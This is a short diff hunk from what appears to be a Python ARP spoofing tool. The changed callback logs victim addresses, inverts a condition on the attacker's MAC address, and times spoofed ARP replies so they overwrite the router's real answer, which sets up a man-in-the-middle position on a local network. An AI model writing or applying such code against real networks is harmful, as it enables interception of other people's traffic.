@@ -164,7 +164,7 @@ def arp_scout_callback(packet):
         victim_addresses[requestor_ip] = src_mac
 
         #do not answer immediatly after router does (when victim broadcasts)
-        if dst_mac == ATTACKER_MAC:
+        if not dst_mac == ATTACKER_MAC:
             time.sleep(2.0) #send after 2s to overwrite
 
         arp_spoof(requestor_ip, router_ip)
